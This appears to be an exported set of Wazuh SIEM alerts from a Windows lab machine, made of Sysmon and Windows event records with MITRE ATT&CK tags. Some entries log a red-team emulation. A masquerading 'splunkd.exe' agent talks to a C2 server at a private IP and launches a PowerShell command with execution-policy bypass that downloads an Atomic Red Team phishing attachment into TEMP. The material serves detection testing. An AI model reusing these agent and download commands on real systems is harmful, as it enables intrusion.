Cab Guid: 0""",0,2024-12-10T17:47:01.8918404Z,391,0,DESKTOP-QGB4EQH,0,0,INFORMATION,Windows Error Reporting,2,FALSE,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608,windows_eventchannel,log,"Dec 10, 2024 @ 17:47:01.748",EventChannel,1733852821,"Dec 10, 2024 @ 17:47:01.748","1541616759451971466, 5, RADAR_PRE_LEAK_64, Not available, 0, SearchApp.exe, 10.0.19041.5073, 10.0.19045.2.0.0,   \\\\?\\C:\\Users\\mari\\AppData\\Local\\Temp\\RDRABA.tmp\\empty.txt  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERC12.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERD0D.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER1299.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER1375.tmp.txt, 0, 1400a246-3ebc-4c5a-bff8-9642f054237d, 268435456, b5e519029d79d016d564ec465eec6f8a, 0", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,8_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:47:11.141
ProcessGuid: {15959494-7e89-6758-7602-000000000300}
ProcessId: 3348
Image: C:\Windows\System32\taskhostw.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:47:11.1522736Z,9052,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:47:11.999",EventChannel,1733852831,"Dec 10, 2024 @ 17:47:11.999", , , , , ,taskschd.dll,C:\\Windows\\System32\\taskhostw.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7e89-6758-7602-000000000300},3348,47:11.1,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,__RRspMBtNh2X6vnUt-V,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:48:43.406
ProcessGuid: {15959494-7efb-6758-b902-000000000300}
ProcessId: 9936
Image: C:\Windows\System32\taskhostw.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:48:43.4134560Z,9174,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:44.174",EventChannel,1733852924,"Dec 10, 2024 @ 17:48:44.174", , , , , ,taskschd.dll,C:\\Windows\\System32\\taskhostw.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7efb-6758-b902-000000000300},9936,48:43.4,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,APRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:48:45.343
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\svg-ap.ceb0fe4a44ac8a5d71d5[1].js
CreationUtcTime: 2024-12-10 17:48:45.343
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:48:45.7179056Z,9175,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:46.458",EventChannel,1733852926,"Dec 10, 2024 @ 17:48:46.458", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,48:45.3, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\svg-ap.ceb0fe4a44ac8a5d71d5[1].js,48:45.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,A_RRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:48:47.718
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\9F2F9MHX\experiences_weather-info-card_dist_location-list_LocationList_js.a3f0879bd8ed824f6406[1].js
CreationUtcTime: 2024-12-10 17:48:47.718
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:48:47.7320552Z,9178,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,4,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:48.189",EventChannel,1733852928,"Dec 10, 2024 @ 17:48:48.189", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,48:47.7, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\9F2F9MHX\\experiences_weather-info-card_dist_location-list_LocationList_js.a3f0879bd8ed824f6406[1].js,48:47.7, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,CPRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1000,0x80000000000000, ,2,Application,0,"""Faulting application name: Calculator.exe, version: 10.2103.8.0, time stamp: 0x6062256a
Faulting module name: ucrtbase.dll, version: 10.0.19041.3636, time stamp: 0x81cf5d89
Exception code: 0xc0000409
Fault offset: 0x000000000007286e
Faulting process id: 0x1e94
Faulting application start time: 0x01db4b2b5dc17188
Faulting application path: C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe\Calculator.exe
Faulting module path: C:\WINDOWS\System32\ucrtbase.dll
Report Id: 20d6487c-ccbf-4b82-ba74-ca0bd889f73f
Faulting package full name: Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe
Faulting package-relative application ID: App""",0,2024-12-10T17:50:13.9574911Z,394,0,DESKTOP-QGB4EQH,100,0,ERROR,Application Error,1,FALSE,9,Windows application error event.,"[""windows"",""windows_application"",""system_error""]",60602,windows_eventchannel,log,"Dec 10, 2024 @ 17:50:13.727",EventChannel,1733853013,"Dec 10, 2024 @ 17:50:13.727","Calculator.exe, 10.2103.8.0, 6062256a, ucrtbase.dll, 10.0.19041.3636, 81cf5d89, c0000409, 000000000007286e, 1e94, 01db4b2b5dc17188, C:\\Program Files\\WindowsApps\\Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe\\Calculator.exe, C:\\WINDOWS\\System32\\ucrtbase.dll, 20d6487c-ccbf-4b82-ba74-ca0bd889f73f, Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe, App", , ,"[""IV_35.7.d""]","[""4.3""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,CfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T17:50:12.9934490Z,1044,10032,DESKTOP-QGB4EQH,12544,716,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,1,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 17:50:13.793",EventChannel,1733853013,"Dec 10, 2024 @ 17:50:13.793", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x2b4, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,D_RRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:51:09.759
ProcessGuid: {15959494-7f8d-6758-f502-000000000300}
ProcessId: 6492
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:51:09.7766476Z,9369,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 17:51:10.670",EventChannel,1733853070,"Dec 10, 2024 @ 17:51:10.670", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7f8d-6758-f502-000000000300},6492,51:09.8,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg query \""HKEY_CURRENT_USER\\Control Panel\\International\\Geo\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,EPRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 17:52:12.747
ProcessGuid: {15959494-7fcc-6758-f802-000000000300}
ProcessId: 10224
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:52:12.7496668Z,9379,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021,windows_eventchannel,log,"Dec 10, 2024 @ 17:52:13.533",EventChannel,1733853133,"Dec 10, 2024 @ 17:52:13.533", , , , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-7fcc-6758-f802-000000000300},10224,52:12.7,"SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,EfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:52:12.841
ProcessGuid: {15959494-7fcc-6758-f802-000000000300}
ProcessId: 10224
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_pp3wbkbi.vbr.ps1
CreationUtcTime: 2024-12-10 17:52:12.841
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:52:12.8478286Z,9387,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,7,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:52:13.655",EventChannel,1733853133,"Dec 10, 2024 @ 17:52:13.655", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7fcc-6758-f802-000000000300},10224,52:12.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pp3wbkbi.vbr.ps1,52:12.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
